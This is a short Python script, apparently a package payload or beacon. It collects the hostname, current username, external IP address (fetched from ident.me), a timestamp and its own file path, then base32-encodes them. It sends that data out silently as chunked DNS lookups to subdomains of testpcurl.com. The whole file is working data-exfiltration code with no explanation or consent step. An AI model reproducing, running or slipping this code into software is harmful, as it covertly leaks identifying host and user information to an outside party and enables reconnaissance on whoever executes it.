import socket, os, base64, getpass, math, hashlib

try:
    from urllib.request import urlopen
except ImportError:
    from urllib2 import urlopen

external_ip = "?"
try:
    external_ip = urlopen('https://ident.me').read().decode('utf8')
except:
    pass

from datetime import timezone 
import datetime 
  
  
dt = datetime.datetime.now() 
utc_time = dt.replace(tzinfo = timezone.utc) .timestamp()

data = "{},{},{},{},{}".format(int(utc_time), socket.gethostname(), getpass.getuser(), external_ip, os.path.abspath(__file__))
encoded_data = base64.b32encode(bytearray(data, 'ascii')).decode('utf-8').replace("=", "0")

fingerprint = hashlib.md5(encoded_data.encode('utf-8')).hexdigest()

def divide_chunks(l, n):
    for i in range(0, len(l), n):
        yield l[i:i + n]

MAX_SUBDOMAIN_LENGTH = 57

for i in range(0, math.ceil(len(encoded_data) / (4*MAX_SUBDOMAIN_LENGTH)), 1):
    
    url = "{}.{}.testpcurl.com".format(".".join(divide_chunks(encoded_data[i*4*MAX_SUBDOMAIN_LENGTH:(i+1)*4*MAX_SUBDOMAIN_LENGTH], MAX_SUBDOMAIN_LENGTH)), fingerprint[0:6] + str(i))
    print(url)
    try:
        socket.getaddrinfo(url, 80)
    except:
        pass
